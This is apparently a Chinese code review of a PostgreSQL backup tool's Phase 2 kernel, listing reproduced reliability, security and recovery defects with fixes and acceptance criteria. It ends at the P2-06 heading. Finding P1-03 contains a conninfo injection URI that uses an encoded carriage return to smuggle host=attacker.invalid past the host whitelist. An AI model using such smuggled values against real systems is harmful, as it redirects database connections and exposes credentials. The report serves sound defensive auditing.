# Phase 2 备份执行内核评审（第 1 轮）

评审日期：2026-10-03。基线：`5026eaa..13a26c1baaea9f38a1f1988a7e13d50fbcf814ff`，评审时 HEAD 即 `13a26c1`，与指定提交的范围一致。依据：`docs/dev-plan.md:26` 的协议 A、`:44` 的协议 B、`:71` 的协议 E，以及 `:120` 的 Phase 2 任务与 DoD。

**结论：未通过。共 24 项：P0 0 项、P1 15 项、P2 9 项。** 正常路径的流式加密、完整密文哈希和非零退出拒绝提交基本成立，但故障收敛、凭据保护、状态机与 M1 验收存在阻断问题。这里只评审和复现，未修改生产实现。

严重度口径：P0 为已证实的紧急、广泛破坏或泄密；P1 为合并/Phase 2 验收前必须修复的安全、可靠性、恢复能力问题；P2 为受限场景的正确性、维护性问题。没有为满足分组而把条件性风险升级为 P0。

## 验证范围与执行结果

检查了 dumper、agekey、crypto、manifest、staging、jobs、pgclient、Phase 2 API、迁移、OpenAPI/生成类型、CLI 接线，以及既有实例锁、数据库 PRAGMA 和 API guard。检查了该范围全部生产 SQL 调用及其参数来源。

| 检查 | 结果及限制 |
| --- | --- |
| `git show 13a26c1 --stat`、基线差异 | 27 个文件；注意额外提交了 `backend/internal/jobs/-` 明文 custom dump。 |
| `GOCACHE=/tmp/supabackup-review-go-cache go build ./backend/...` | 通过。最初默认 Go 缓存只读，改用 `/tmp` 后构建成功。 |
| `GOCACHE=/tmp/supabackup-review-go-cache go vet ./backend/...` | 通过。 |
| `GOCACHE=/tmp/supabackup-review-go-cache go test -race ./backend/...` | **整体未通过，环境阻塞**：server 的 `httptest.NewServer` 监听被沙箱拒绝（`socket: operation not permitted`）。其余有测试的包返回通过；jobs 的两个真实 PG 测试实际 SKIP，不能当作集成验证通过。 |
| `go test -v ./backend/internal/jobs -run 'TestM1\|TestInterrupted' -count=1`（同一可写缓存） | 两项均因 `docker run` 不可用而 SKIP。 |
| Docker / 真 PG | Docker socket 权限拒绝；`sudo -n docker` 被当前环境的 `no new privileges` 禁止。没有启动容器，也没有声称重新完成真 PG M1。 |
| Bash / YAML | 两个 `scripts/spike*.sh` 的 `bash -n` 通过；OpenAPI、CI YAML 可解析；CI 的 14 段 shell 均通过语法检查。这不是 OpenAPI 语义校验或类型生成无漂移证明。 |
| 定向复现 | 临时加入包内复现测试，使用 `-race` 执行；另直接调用已安装 libpq 的 `PQconninfoParse`。证实下表问题。临时测试已从仓库移除，只保留本报告；会话证据在 `/tmp/supabackup-phase2-review-evidence/`。 |

复现函数是“断言当前缺陷存在”的审计探针，其 PASS 不表示实现正确。永久回归测试应反转相关断言。

| 探针/操作 | 实测证据 |
| --- | --- |
| `TestReviewPipeFailureHangsUntilCancel` | 有限 1 MiB stderr，以及有限 1 MiB stdout + 无效 recipient，两种情况均持续阻塞；外部 cancel 后才返回。 |
| `TestReviewWaitDelayDoesNotBoundExternalPipeReaders` | 持管道的子进程另建 session 后，取消超过 5 秒的 `WaitDelay` 仍不返回；手动终止该测试子进程组后才收敛。测试已清理子进程。 |
| `TestReviewConnectionParsing/control_character_injection` + libpq | 校验的 host 为 `127.0.0.1`，pgx 与 libpq 实际解析 host 均为 `attacker.invalid`。无需网络即可证明白名单失效。 |
| `TestReviewConnectionParsing/empty_password` | `postgres://app@127.0.0.1/appdb?sslmode=disable` 生成 pgx config 后，Database 为 `""`、Password 为 `"dbname=appdb"`。 |
| `TestReviewConnectionParsing/inherited_pgoptions` | pgx 接受父进程的 `PGOPTIONS=-c statement_timeout=1`；dumper 则移除了该变量。 |
| `TestReviewConnectionParsing/malformed_query_downgrades_tls` | `sslmode=%ZZ` 未报错，实际得到 `prefer`。 |
| `TestReviewCreateDatabaseParseErrorLeaksSecret` | 不启动 HTTP listener，直接执行真实 API handler；400 响应完整包含 URI 中的 `REVIEW_CANARY` 密码。 |
| `TestReviewRedactionRetainsSecret` | `password=REVIEW_CANARY` 变成 `password=[REDACTED]REVIEW_CANARY`。 |
| `TestReviewConnectionParsing/quoted_password_suffix_leaks` | 含单引号和空格的口令在 pgx 配置错误中残留 `REVIEW_CANARY` 后缀；应用现有替换逻辑无法删除。 |
| `TestReviewPendingCancelStillRuns` | 已取消 pending job 仍进入 `runJob`、访问 recipient，最终 `status=failed, cancel_requested=true`。 |
| `TestReviewConcurrentEnqueue` | 两个并发调用在本次第 5 轮产生两条活动 job；SQLite WAL 与 `-race` 均不能消除该竞态。 |
| `TestReviewRescheduleChangesTaskIdentity` | 模拟同库占用后，五次碰撞将任务 ID 从 1 改为 6；旧 ID 查不到，wake 仍有信号。 |
| `TestReviewStopDoesNotStopActiveJob` | `Stop()` 返回后，活动 job 的 context 仍未取消；用测试自己的 cancel 才结束。 |
| `TestReviewPreStartFailureLeaksPipes` | 连续 10 次创建暂存文件失败，观测 FD 从 7 增至 31；依赖 GC 回收，未显式关闭。 |

## P0

本轮没有确认 P0。以下 P1 已足以阻止 Phase 2 验收；没有重新运行真实恢复，不能据此断言生产备份已经发生数据损坏。

## P1

### P1-01：管道限量与错误监督方式可使唯一 worker 永久阻塞

**位置：** `backend/internal/dumper/dumper.go:273`、`:290`、`:291`、`:292`、`:233`；`backend/internal/agekey/agekey.go:72`。

**问题：** stderr 读取是 `ReadAll(LimitReader(..., 64 KiB))`，达到上限后完全停止消费，并没有按注释丢弃后续字节。pg_dump 再写满内核 stderr 管道就无法继续/退出，stdout 消费者等不到 EOF。另一方面，加密解析失败或密文写入 ENOSPC 时，消费者提前返回，父流程仍等待 stderr EOF / `Wait`，却不终止正在写 stdout 的生产者。正常 runner 没有 job 超时，单个任务足以占死全局执行槽。

`WaitDelay` 不能补救这里自建的 reader goroutine：当前使用 `StdoutPipe/StderrPipe`，阻塞发生在调用 `Wait()` 之前；逃离原进程组的持管道子进程也不会由该设置自动收敛。已用有限 1 MiB 输出以及 `setsid` 子进程分别复现。Go 的 [`StdoutPipe`/`WaitDelay` 约定](https://pkg.go.dev/os/exec)要求调用者正确管理读取生命周期，不能简单把 `Wait()` 提前到未读完的位置，否则又引入截断。

**可执行修复：** stderr 始终读到 EOF，只限制保留的前缀/尾部长度并计数；为进程、stdout 加密、stderr 建立统一监督。一端失败立即取消进程组、关闭本方管道，在明确时限内回收进程与 reader；成功时仍保证完整读取后再完成提交。可采用显式拥有的 `os.Pipe` 或交由 exec 管理的 Writer 模式，但必须明确 EOF、关闭和 `Wait` 的责任。stderr I/O 错误不能被 `_` 忽略。

**验收标准：** 超过 64 KiB 的 stderr 不阻塞，保存量有界；消费者第 N 字节报错、age 初始化/Close 报错、ENOSPC、持管道子进程存活、取消/超时都在规定时间内结束；无最终 artifact、无活动子进程/reader、无凭据目录；下一任务可运行。保留“先输出再退出 1”的既有拒绝提交测试。

### P1-02：脱敏只添加标签，密码仍进入 API、日志及 SQLite 错误文本

**位置：** `backend/internal/dumper/dumper.go:163`；`backend/internal/jobs/jobs.go:393`、`:287`、`:375`、`:356`；`backend/internal/server/api_phase2.go:88`、`:95`、`:287`；`backend/internal/pgclient/pgclient.go:65`。

**问题：** 三处 sanitizer 均未删除秘密值；`postgres://[REDACTED]user:password@host` 仍泄露原 URI。`url.Parse` 失败被 `%w` 包装，其 `url.Error` 含完整输入，CreateDatabase 又原样返回。实测非法端口 URI 的 400 响应带完整密码。锁定版本 pgx 的配置错误脱敏也不能替代应用边界保护：密码含转义单引号和空格时，在无效 PGSERVICE 配置错误中实测泄漏后缀。正常的 pgx 连接错误并非必然泄密，问题是这些具体错误分支与不生效的兜底。

成功 dump 的 stderr 会被写日志；失败 job 的错误会被写 SQLite 并由任务 API 返回，因此暴露面不限于原请求者看到自己的输入。当前 canary 测试的 fake pg_dump 根本没有把 canary 写入 stderr，不能验证 sanitizer。

**可执行修复：** URI/配置解析错误返回固定错误码与不含输入的说明，不输出 `url.Error.URL` 或完整 conninfo。统一错误脱敏入口，优先基于结构化错误生成公开消息；必要的 stderr 应删除已知密码及其转义/编码表示，再按结构处理 URI、keyword/value 和多行字段，最终限长。不能只依赖第三方 `Error()` 自带脱敏。panic 内容也不得不经处理写入 job/API。

**验收标准：** 在 malformed URI、TLS/CA/service 配置失败、连接失败、dump warning、dump 失败、panic 等路径注入含 `:'\\ @%` 的 canary，扫描 API、SQLite、日志、stderr 摘要、`/proc/<pid>/cmdline` 与生成命令；不得出现明文或可直接还原的编码秘密。PGPASSFILE 在执行期间允许包含凭据，但退出后必须删除。

### P1-03：conninfo 对 CR/VT/FF 的漏转义绕过 URI 参数白名单

**位置：** `backend/internal/pgclient/pgclient.go:92`、`:124`、`:129`；`backend/internal/pgclient/pgx.go:16`、`:42`。

**问题：** 两个 quoting 函数只识别空格、TAB、LF、反斜杠和单引号，遗漏 libpq/pgx 同样视为空白的 `\r`、`\v`、`\f`。ParseURI 会解码这些字节，但不拒绝。可用输入：

```text
postgres://app:pw@127.0.0.1/appdb%0Dhost=attacker.invalid?sslmode=disable
```

`ConnInfo.Host` 看似安全，拼接后的 `dbname=appdb\rhost=attacker.invalid` 却向驱动注入第二个 host。已分别用项目的 pgx 和系统 libpq 解析证实。这是连接参数注入，不是 SQL 注入，也不是 shell 注入。相同方式可注入 `passfile/service/sslkey/options` 等被禁止的参数；经 `application_name` 末尾注入时还可覆盖 TLS 参数。pgx 独有的 `servicefile`、以及 `sslrootcert/sslcert/sslpassword` 等文件/秘密相关配置同样不能任意放行。

**可执行修复：** 使用一个经过验证的 conninfo 编码器，所有字符串值包括空串一律单引号包裹并正确转义；URI 解码后拒绝不支持的控制字符，尤其 NUL 与影响 passfile 行边界的 CR/LF。pgx 配置再增加锁定版本支持的 `ConnStringAllowedKeys` 防线，但不能用它替代正确编码。参数语法可核对 [libpq 官方说明](https://www.postgresql.org/docs/18/libpq-connect.html)。

**验收标准：** 对 user、database、password、application_name 分别测试 `%0D/%0B/%0C/%00` 及参数拼接载荷；两种驱动得到完全相同的原字段，或在任何文件/网络访问前拒绝。危险参数不能由任何字段绕入。

### P1-04：取消请求未参与状态转换，`canceled` 实际不可达

**位置：** `backend/internal/jobs/jobs.go:167`、`:190`、`:208`、`:224`、`:252`、`:347`、`:366`。

**问题：** Cancel 只写 `cancel_requested=1` 并尝试调用内存 map；claim/run 从不读该标志，所有错误统一写 `failed`，没有任何写 `canceled` 的 SQL。已取消的 pending job 仍执行。还有一个确定的时序窗口：job 已改为 running，但 cancelFn 尚未注册，此时 Cancel 成功返回却无法取消 context，后续也不补查。运行中取消最终变成 failed；dumper 返回以后至 manifest/SQLite 成功更新期间的取消也无一致的提交边界。

**可执行修复：** pending 的取消原子转为 canceled；claim 仅允许未取消任务。注册 cancelFn 与持久化 cancel 标志形成可收敛握手，注册后补查标志。区分用户取消、实例停机和普通失败，分别收敛到 canceled、interrupted、failed。明确“取消与最终提交谁先原子获胜”的规则，并通过带状态/取消条件的 UPDATE 及 `RowsAffected` 实现，不能以一个注释代替线性化点。

**验收标准：** 在 pending、claim 前后、cancelFn 注册前后、dump 中、Sync/rename 前后、SQLite 提交前后设置屏障；取消不能漏执行，也不能反转已提交成功任务。pending 被取消后不连接 PG、不创建 PGPASSFILE。每条任务只有一个终态。

### P1-05：并发 Enqueue 的检查与插入不原子

**位置：** `backend/internal/jobs/jobs.go:104`；`backend/internal/db/migrations/0004_backup_kernel.sql:46`。

**问题：** `COUNT(active)` 和 `INSERT` 是两个独立语句，无事务、无活动任务唯一约束。两个 API 请求可以同时读到 0，然后各自插入 pending；已复现。现有索引只是普通索引。单 worker 会串行执行这些重复任务，**不是已证实的并行 pg_dump**，但破坏了接口承诺的 409 去重并制造多余备份。Go 内存 race detector 不会发现。

**可执行修复：** 以数据库约束兜底，例如按 `database_id` 建立 `WHERE status IN ('pending','running')` 的部分唯一索引，将对应约束冲突映射为 ErrAlreadyQueued；迁移先明确处理既存重复行。涉及目标存在性等多步判断时使用同一短事务。

**验收标准：** 同一 database 的两个乃至几十个同步并发 Enqueue，恰有一个创建成功，其余均返回约定冲突；活动行始终为 1。任务终结后可再次入队，不同 database 可各自入队。

### P1-06：删除数据库与入队存在 TOCTOU，级联删除可抹掉活动任务

**位置：** `backend/internal/server/api_phase2.go:139`、`:150`、`:163`；`backend/internal/db/migrations/0004_backup_kernel.sql:29`；`backend/internal/jobs/jobs.go:347`。

**问题：** DeleteDatabase 先查活动数、再 DELETE；中间 Enqueue 可以插入并被 worker 领取。DELETE 会因 `ON DELETE CASCADE` 删除新任务，已加载凭据的 worker 却可继续 dump。最后 UPDATE 成功执行但影响 0 行，代码仍记录 `backup succeeded`。另外，即使无竞态，删除 database 也会抹掉历史备份记录，而本地产物仍存在；当前没有对应的发现/生命周期处理。

**可执行修复：** 在同一个写事务内完成活动检查与删除，或采用带 `NOT EXISTS(active job)` 的原子条件删除，且所有创建路径受相同数据库一致性约束保护。保留有备份历史的目标稳定 ID，优先软删除；硬删除需明确处理历史引用，不能随手 cascade。最终任务更新必须校验状态和受影响行数。

**验收标准：** 用屏障重放“删除检查通过 → 入队/领取 → 删除”顺序，只允许删除成功且入队失败，或入队成功且删除 409；不能出现 202 返回任务随后无踪、无任务的活跃 dump 或 0 行更新却成功的日志。删目标后历史备份仍可定位。

### P1-07：Stop 不取消也不等待 worker，服务退出可能抢在进程与凭据清理之前

**位置：** `backend/internal/jobs/jobs.go:131`、`:142`、`:162`；`backend/cmd/supabackup/main.go:203`、`:204`、`:245`。

**问题：** Stop 仅关闭 stopCh，内部 drain 循环和活动 job 不观察它，没有 WaitGroup/join。已复现 Stop 返回后活动 job context 仍未取消。runServe 的信号 context 虽会取消，但主 goroutine 只等待 HTTP Shutdown，随后即可关闭 SQLite、退出进程，不能保证 cancel watcher 已终止 pg_dump、Wait 已回收、PGPASSFILE 已删掉。HTTP listener 启动失败的退出路径同样没有等待后台任务。

**可执行修复：** Runner 持有自己的可取消生命周期 context，Stop/Shutdown 停止 claim、取消活动任务、等待 worker 与子进程收敛；在完成后才关闭 store/退出主进程。对正常关停明确记录 interrupted，并给关停预算超限留下可恢复证据。单次 Start 应受保护，避免重复启动绕过单 worker 假设。

**验收标准：** 备份中 SIGTERM、HTTP bind 失败、直接调用 Stop，都在预算内停止 worker；无后续 job 被领取、无子进程和 passfile 残留，SQLite 关闭前完成状态落库。调用 Stop 两次安全；Stop 返回后不再访问 store。

### P1-08：pgx 与 pg_dump 的环境、CA 和连接参数语义没有统一

**位置：** `backend/internal/pgclient/pgx.go:15`、`:29`、`:33`；`backend/internal/dumper/dumper.go:207`；`backend/cmd/supabackup/main.go:151`。

**问题：** 只有 pg_dump 子进程清理 PG*，`pgx.ParseConfig` 仍读取父进程 PGOPTIONS、PGSERVICE/PGSERVICEFILE、PGSSLROOTCERT 等。已复现 PGOPTIONS 进入 pgx config；service 文件还可能在连接前触发读文件/报错。pgx 的 application_name 强制追加 `_supabackup`，dumper 却使用原值。CA 也未显式配置为双方同一来源：当前 pgx 在无显式 RootCAs 时可使用 Go 系统根证书，libpq 的 verify 模式需要其认可的 root.crt/显式根配置，不能仅因 sslmode 文本相同就宣称一致。两边还会受默认 HOME 证书文件影响。

**可执行修复：** 在启动任何 PG 配置解析和 goroutine 前清理继承 PG*，或建立完全受控的配置构造路径；不要每请求临时修改全局环境。显式固定 CA、客户端证书、passfile 策略与 application_name，并为 pgx/libpq 使用同一可信配置。应用应映射允许的 CA 来源，不能开放任意 URI 文件路径。环境默认值见 [libpq 文档](https://www.postgresql.org/docs/18/libpq-envars.html)，证书语义见 [SSL 支持文档](https://www.postgresql.org/docs/18/libpq-ssl.html)。

**验收标准：** 注入 PGHOSTADDR、PGOPTIONS、PGSERVICE、PGSSLROOTCERT、PGSSLKEY、PGPASSFILE 后两条链语义不变；CA 正确/错误、hostname 匹配/不匹配、自签证书、TLS 禁用分别获得一致结果；断言真实端点、数据库、用户、application_name 与 TLS 校验状态。

### P1-09：默认允许未验证/明文回退，且错误 query 被静默忽略

**位置：** `backend/internal/pgclient/pgclient.go:94`、`:95`；`backend/internal/server/api_phase2.go:228`；`api/openapi.yaml:585`。

**问题：** 未传 sslmode 默认 prefer，用户未明确选择就接受未验证证书及明文回退，与 Phase 2 的显式配置要求不符。Database API 没有 TLS 模式/校验状态，日志打一行不能实现持续可见。`u.Query()` 还吞掉 query 解析错误，实测 `sslmode=%ZZ` 直接变成 prefer，错误配置被当成可连接配置。

**可执行修复：** 远程连接默认 verify-full，或强制显式选择安全模式；弱模式需在注册配置中明确选择，并持久保存/由 API 返回不含秘密的状态。改用返回错误的 `url.ParseQuery`，拒绝无效转义、分隔符、重复键、非法 fragment 等含糊输入，不能降级。实际是否使用 TLS、是否验证证书应区别于仅配置了什么。

**验收标准：** 未选模式的远端、不受信任证书、错误 hostname 不会成功注册；只有显式弱模式才允许相应连接，并可持续查询风险状态。`sslmode=%ZZ`、重复 sslmode、query 分号错误均为 400，不发起连接。

### P1-10：manifest 尚不满足协议 E，恢复依赖与覆盖声明不完整

**位置：** `backend/internal/manifest/manifest.go:14`、`:40`、`:53`、`:59`；`backend/internal/jobs/jobs.go:299`、`:310`；`backend/internal/pgclient/pgclient.go:243`。

**问题：** 缺实际归档 TOC、restore/验证目标版本、恢复 profile、age 的具体版本、编码/locale、owner/ACL 信息。Roles 只取关系和函数 owner，遗漏 ACL-only grantee、schema/type 等 owner、default ACL、策略引用等；完整归档恢复可因角色不存在失败。依赖采集先于 dump 且使用独立连接/快照，DDL 并发时记录还可能与归档不同。

`CreatedAt=start` 在客户端探测、暂存准备、真正获取 PG 快照之前赋值，不能称为“导出快照时刻”。`entire database ... no exclusions` 加一个 `HasForeignTables` 布尔值也不能表达 FDW 只含定义、不默认导出外部数据。该行为及跨版本恢复限制以 [pg_dump 官方文档](https://www.postgresql.org/docs/18/app-pgdump.html)为准；角色共享依赖可参考 [`pg_shdepend`](https://www.postgresql.org/docs/18/catalog-pg-shdepend.html)。

**可执行修复：** 扩展 manifest v1 的必要字段，未执行的验证必须显式标未配置/未验证；记录适用的恢复目标与工具版本。通过该次 custom archive 的 TOC 采集真实对象集合，不能以另一次 catalog 查询冒充。依赖查询覆盖 owner/ACL/策略等共享角色依赖及编码/locale；尽可能与 dump 共用受控导出快照。取得真实 snapshot 时间，或将当前字段如实命名为 dumpStartedAt、快照时间未知。明确 FDW 外部数据等不覆盖范围，不收录订阅连接串、user mapping 密码等秘密。

**验收标准：** 新集群只有“密文、manifest、离线 identity、明确版本的标准工具”即可按 manifest 准备依赖并恢复。fixture 必须含仅获 GRANT 的角色、独立 schema/type owner、default ACL、RLS、扩展、large object、FDW、非默认 locale；manifest 的 TOC 与 `pg_restore --list` 一致；并发 DDL 不产生虚假的覆盖/依赖声明。密码和 identity 不出现在 manifest。

### P1-11：本地提交缺少 manifest fsync 与目录 fsync，成功记录不等于可持久恢复

**位置：** `backend/internal/dumper/dumper.go:322`、`:335`；`backend/internal/jobs/jobs.go:337`、`:347`、`:402`。

**问题：** artifact 虽执行文件 Sync/Close，但 rename 后不 fsync 目录。manifest 仅 `os.WriteFile` 后 rename，内容和目录都没 Sync。发生断电/内核崩溃时，SQLite 成功状态与 artifact/manifest 的目录项或内容持久性没有受控先后关系。原子 rename 防止读到半次重命名，不保证掉电持久化；这不是普通进程崩溃就必然复现的问题。[Linux fsync 文档](https://man7.org/linux/man-pages/man2/fsync.2.html)明确区分文件与父目录同步。

**可执行修复：** 共用经测试的 durable-write helper：同目录安全创建临时文件 → 完整写入 → 文件 Sync → Close → rename → 父目录 Sync；artifact 和 manifest 均完成后才更新成功状态。所有错误传播，失败清理临时文件。协调 SQLite 的持久化策略与启动对账，不能假定多个文件天然跨介质原子提交。

**验收标准：** 注入文件 Write/Sync/Close、rename、目录 Sync 失败，均无 succeeded；在每个边界强制退出并恢复，成功状态必须对应完整且哈希匹配的 artifact 与可解析 manifest。特权掉电/文件系统故障测试在隔离 CI fixture 做。

### P1-12：artifact 已提交后的失败没有持久引用与恢复处理

**位置：** `backend/internal/jobs/jobs.go:334`、`:339`、`:347`、`:91`；`backend/internal/staging/staging.go:72`、`:78`；`backend/internal/dumper/dumper.go:338`。

**问题：** manifest 写失败后 job 变 failed，但 artifact 路径/哈希未入库，已提交密文永久留在 staging；`.manifest.json.tmp` 也不被启动清理覆盖。成功状态 UPDATE 遇 SQLITE_BUSY/磁盘错误后只记录日志并返回，job 持续 running，之后同库 Enqueue 被拒绝；重启则一律 interrupted，仍不关联实际 artifact。成功更新也不检查 `RowsAffected`。staging 明确永不回收 committed 文件，后续只能堆积无法追踪的对象。

**可执行修复：** 引入持久化的本地产物提交意图/路径及状态，发生后续错误时保留引用和可重试动作；启动验证文件、哈希、manifest 后幂等完成本地提交或隔离为待处理产物，禁止凭 running/文件名直接删除。对明确可丢弃的失败临时文件清理并检查错误。终态落库做有界重试与告警，更新必须恰好影响预期任务，不能悄悄放弃。

**验收标准：** 在 artifact rename 后、manifest 写入/rename 后、SQLite UPDATE 前后分别注入崩溃/BUSY/ENOSPC；重启后每个密文有可追踪归属，不能重新 dump 来掩盖状态不一致，也不能永久 running。无未管理 `.tmp`；有效密文不被孤儿回收误删。

### P1-13：独立暂存配额并未实现，64 MiB 门槛无法限制单任务写满磁盘

**位置：** `backend/internal/staging/staging.go:19`、`:44`；`backend/internal/dumper/dumper.go:182`、`:185`、`:368`；`backend/internal/config/config.go:22`。

**问题：** Staging 只有目录和 FreeBytes，没有配额配置、占用计算、预留或写入预算。Run 仅检查文件系统可用空间 ≥64 MiB，注释所称按数据库体积保守预留也未实现。一个大数据库即可耗尽包含 SQLite/凭据文件的卷；正常成功产物持续增长也不受预算约束。ENOSPC 还会触发 P1-01 的消费者失败死锁。Phase 3 的保留策略未实现不是本条指责，Phase 2 明确要求的独立暂存预算已缺失。

**可执行修复：** 加入 staging 字节/任务预算、占用与活动预留，保证控制状态盘安全余量；按计划要求基于源数据/解压后规模进行保守预检，写入中继续执行预算限制。超额拒绝或中止任务并可靠清理临时产物，不删除已提交备份来绕过预算。

**验收标准：** 文件系统剩余很多但 staging 已达配额时仍拒绝；压缩率极差/大字段/超大数据流不会突破预算或耗尽 SQLite 余量；配额中止能释放执行槽和临时占用。已有成功备份保持完整。

### P1-14：M1 核对的是源库，且没有真正证明脱离应用恢复

**位置：** `backend/internal/jobs/m1_test.go:125`、`:133`、`:149`、`:240`、`:246`、`:268`、`:272`、`:82`；关联 `.github/workflows/ci.yml:23`。

**问题：** `countRows(t, verifyURI)` 虽先测试 verifyURI 连接，实际 SQL 命令硬编码 `-d appdb`，因此检查的是源库，恢复库少行或错数据仍可能通过。测试还一直保留应用 store，使用本应用的 `agekey.DecryptStream`，在同一集群建库、`--no-owner` 绕开 owner 依赖，仅比行数。它没有执行 DoD 要求的移除应用/SQLite后、用独立工具在新 PG 环境恢复。Docker 启动的任意失败都被 SKIP，也未建立 CI 必跑且不得 skip 的 M1 门禁。

**可执行修复：** countRows 真正使用目标数据库，增加全部内容/类型/sequence/约束核对。应用退出、SQLite 和应用主密钥移除后，把密文、manifest、离线 identity 交给独立 age CLI 和 PG 工具，在另一全新集群按声明 profile 恢复。CI 单独 provision 匹配 PG 客户端与数据库，必跑模式下 Docker、拉镜像或客户端不可用必须失败；本地允许显式 skip。

**验收标准：** 恢复库置空、删一行、修改 payload、破坏 sequence/ACL 中任一操作都使 M1 失败；断开/移除源库后仍能完成验证。必须提供工具版本、fixture/seed、内容校验和 CI 执行证据；M1 gate 不能以 SKIP 通过。

### P1-15：客户端回退无恢复矩阵约束，发布镜像仍只装 PG18

**位置：** `backend/internal/dumper/dumper.go:84`、`:95`；`backend/internal/jobs/jobs.go:318`；关联未改动的 `Dockerfile:48`（仍标注 P2 将补多版本）。

**问题：** FindClient 接受任何主版本 ≥ 源库的客户端；没有“经过恢复矩阵验证”的限制。发布镜像只安装 18，因此 PG14–17 通常自动使用 18，而 manifest 不记录目标版本限制。较新 pg_dump 可以读取旧服务器，**不代表**产物可恢复回旧主版本；官方不保证这一点，见 [pg_dump 兼容性说明](https://www.postgresql.org/docs/18/app-pgdump.html)。这正是计划 §0 要求同主版本优先、回退经过恢复矩阵验证的原因。

**可执行修复：** 发布镜像补齐计划支持的 14–18 客户端，选择同主版本；允许的较新回退显式列入经过测试的组合，并将恢复端最低版本/限制写入 manifest。未验证组合拒绝或明确要求用户选择已验证目标，不能仅凭 `>=` 自动认为可恢复。

**验收标准：** 对 PG14–18 源库分别在真实 release image 中备份，再用声明的工具/目标恢复；测试本机 PATH/wrapper 与版本目录混用、同主版本优先、无客户端、禁止向旧恢复端作虚假承诺。记录矩阵证据。

## P2

### P2-01：reschedule 修改任务主键，并可因自唤醒形成忙循环

**位置：** `backend/internal/jobs/jobs.go:198`、`:245`、`:247`；`backend/internal/jobs/queries.go:82`、`:165`。

**问题：** 用修改 id 表示“队尾”破坏 API 已返回的任务地址、取消参数、最新任务/创建顺序语义。若只有一个被占用库的 pending，claim 返回 false 后，reschedule 已重新塞入 wake，外层立即再运行；持续写 SQLite 和增大 id，而不是等待占用释放。已通过设置 perDB 占用复现 ID 1→6 与旧 ID 消失。

**边界：** 当前生产只 Start 一次且同步 runJob，正常情况下 perDB 分支不会因并发 Enqueue 自动触发；不能把它描述成当前单 worker 必然死循环。迁移 0004 也没有引用 `jobs(id)` 的子表，当前并未证实已有子表外键损坏；未来加引用时会违反或级联修改稳定标识。SQLite AUTOINCREMENT 不禁止 UPDATE 主键，且这种 UPDATE 不更新 sqlite_sequence，见 [SQLite 文档](https://www.sqlite.org/autoinc.html)。

**可执行修复：** job ID 不可变；使用独立调度顺序/可执行时间，或 claim 时跳过被占用 database。同库释放后唤醒，有界退避；无可执行任务时不要自唤醒。保护 Start 只执行一次。

**验收标准：** 单个冲突 pending 的 ID、API 地址始终不变，等待期间无高频 DB 写；其他 database 能前进；释放占用后任务被执行。增加指向 job 的外键也不受调度影响。

### P2-02：空密码 conninfo 吞掉后续 dbname 字段

**位置：** `backend/internal/pgclient/pgx.go:16`、`:42`；`backend/internal/pgclient/pgclient.go:88`。

**问题：** 无密码 URI 是 ParseURI 显式允许的输入，但 `pgxQuoteString("")` 返回空串，于是生成 `password= dbname=appdb`。pgx 把后一个 token 当作密码，DBName 为空；已复现。trust、证书认证等无密码连接因此测试失败/连接语义错误，而 dumper 的 DSN 没有这个 password 字段。

**可执行修复：** 合并到 P1-03 的统一编码器，空串编码为 `''`；明确空密码不应触发隐式 HOME/环境凭据替换。尽可能配置解析后再赋值密码，避免它进入可打印 conninfo。

**验收标准：** 无密码和显式空密码 URI 都保持 User/DBName/Password 原值；在 trust/证书 fixture 下 pgx 测试与 pg_dump 均成功且访问同一数据库。

### P2-03：PGPASSFILE 不支持的行分隔字符未拒绝，清理失败被吞掉

**位置：** `backend/internal/dumper/dumper.go:195`、`:200`、`:401`；`backend/internal/staging/staging.go:72`、`:75`、`:83`。

**问题：** 冒号和反斜杠转义正确，但 URI 可含 `%0A/%0D`，这些字符直接写入按行解析的 passfile，造成口令截断/额外记录。普通退出 defer RemoveAll 以及启动 Remove/RemoveAll 均忽略错误，OrphanCleanup 甚至删除失败也报告 removed，导致凭据遗留不可见。liveJobIDs 被完全忽略；目前 main 在 worker 启动前调用尚能避开自己的活动任务，但函数接口宣称的“保护 live job”不成立。

**可执行修复：** 明确拒绝 passfile 无法表示的控制字符；保留正确的 0700/0600 与 `:`/`\\` 转义。清理逐项检查错误、准确返回 removed，并对凭据残留告警；若仅允许启动独占清理就收紧接口，否则真正保护 live 引用。不要为了支持换行密码而改用 argv/PGPASSWORD。

**验收标准：** 特殊字符口令真实 PG 验证；CR/LF/NUL 在注册阶段明确失败。成功、非零退出、Start 失败、取消、写满、崩溃重启均无遗留 passfile；无法删除时测试必须得到错误而非假成功。规则可核对 [libpq 密码文件规范](https://www.postgresql.org/docs/18/libpq-pgpass.html)。

### P2-04：Start 前失败没有关闭已创建的进程管道

**位置：** `backend/internal/dumper/dumper.go:235`、`:239`、`:245`。

**问题：** 先创建 stdout/stderr pipes，再打开临时产物；OpenFile 失败时未 Start，也没有显式清理 Cmd 内部的管道。反复失败可积累 FD，等待 GC/finalizer。十次故障实测 FD 增加 24；具体数量受 GC 时机影响，不是永久不可回收泄漏。

**可执行修复：** 将可失败的文件准备与 recipient 校验移到建立 pipes 之前；管道创建后每条返回路径明确关闭所有已拥有端点。可以调整为显式 os.Pipe 生命周期，但需同时满足 P1-01 的监督要求。

**验收标准：** 重复注入临时文件打开失败、第二条 pipe 创建失败、Start 失败，无需强制 GC，FD 数仍在稳定范围；无临时文件/凭据残留。

### P2-05：错误模型缺少 retryable/稳定错误码，分类会把磁盘与取消错误归 unknown

**位置：** `backend/internal/pgclient/pgclient.go:288`；`backend/internal/dumper/dumper.go:317`、`:375`；`backend/internal/jobs/jobs.go:378`；`backend/internal/db/migrations/0004_backup_kernel.sql:34`；`api/openapi.yaml:653`。

**问题：** 只列出七类字符串，并未落实计划明确要求的 retryable 与错误码。密文写入 ENOSPC 经 EncryptStream 包装后统一标 unknown；pgx context deadline、连接耗尽等也易丢类别。pg_dump 分类只靠继承 locale 的英文文本，服务端版本警告里的 `server version` 又过于宽泛。Test 只执行 version()，未验证备份权限；数据库注册成功不代表具备 dump 权限。

**可执行修复：** 优先按 `errors.Is/As` 的 OS 错误、context、pgconn.PgError.SQLSTATE 分类；dump 文本解析固定 locale 并采用经过 fixture 验证的规则。增加持久 error_code、retryable 和 API 字段；取消/停机交给状态机而非伪装普通失败。连接测试增加可说明边界的权限检查，或分别返回“连接可用”和“备份权限检查结果”。

**验收标准：** ENOSPC/EDQUOT/EIO、28P01、42501、DNS、超时、证书错、版本不匹配各有稳定类别/码/重试策略；不同 locale 结果一致。能登录但无表 SELECT 的账号不得被描述为已通过备份权限验证。

### P2-06：CLI 生成输出无法直接供自身 verify 使用，且私钥输出失败被忽略

